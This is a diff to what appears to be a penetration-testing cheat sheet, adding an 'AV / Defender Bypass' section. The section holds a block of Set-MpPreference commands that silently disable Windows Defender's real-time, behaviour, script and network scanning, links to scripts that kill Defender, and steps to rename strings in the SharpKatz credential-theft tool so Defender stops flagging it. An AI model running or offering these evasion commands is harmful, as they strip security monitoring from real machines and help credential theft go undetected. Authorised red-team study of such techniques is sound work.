@@ -59,7 +59,7 @@ Get-ModifiableServiceFile -Verbose&#x20;
 
 
 
-## **Misc**
+## **AV / Defender  Bypass**
 
 **AMSI Bypass**\
 ****amsi.fail
@@ -67,11 +67,37 @@ Get-ModifiableServiceFile -Verbose&#x20;
 **Disable AV Protection/Monitoring**\
 Set-MpPreference -DisableRealtimeMonitoring $true
 
+Set-MpPreference -DisableArchiveScanning 1 -ErrorAction SilentlyContinue \
+Set-MpPreference -DisableBehaviorMonitoring 1 -ErrorAction SilentlyContinue \
+Set-MpPreference -DisableIntrusionPreventionSystem 1 -ErrorAction SilentlyContinue \
+Set-MpPreference -DisableIOAVProtection 1 -ErrorAction SilentlyContinue \
+Set-MpPreference -DisableRemovableDriveScanning 1 -ErrorAction SilentlyContinue \
+Set-MpPreference -DisableBlockAtFirstSeen 1 -ErrorAction SilentlyContinue \
+Set-MpPreference -DisableScanningMappedNetworkDrivesForFullScan 1 -ErrorAction SilentlyContinue \
+Set-MpPreference -DisableScanningNetworkFiles 1 -ErrorAction SilentlyContinue \
+Set-MpPreference -DisableScriptScanning 1 -ErrorAction SilentlyContinue \
+Set-MpPreference -DisableRealtimeMonitoring 1 -ErrorAction SilentlyContinue
+
+Kill defender:\
+[https://bidouillesecurity.com/disable-windows-defender-in-powershell/](https://bidouillesecurity.com/disable-windows-defender-in-powershell/)\
+[https://github.com/jeremybeaume/tools/blob/master/disable-defender.ps1](https://github.com/jeremybeaume/tools/blob/master/disable-defender.ps1)
+
 **Check Powershell Language Mode**\
 $ExecutionContext.SessionState.LanguageMode
 
 **AppLocker Policy**\
 Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+
+
+
+**Identify Code/Strings Defender may flag**\
+https://github.com/matterpreter/DefenderCheck => C# without builds\
+[https://gist.github.com/daddycocoaman/108d807e89a0f9731304bc848fa219f0](https://gist.github.com/daddycocoaman/108d807e89a0f9731304bc848fa219f0) => python [https://github.com/rasta-mouse/ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) => also c# without builds
+
+DefenderCheck.exe path-to-sharpkatz.exe\
+Visutal studio, CTRL + H, Replace all "Credentials" with "whatever", Scope as "Entire Solution", Replace All, Build andrecheck
+
+
 
 
 
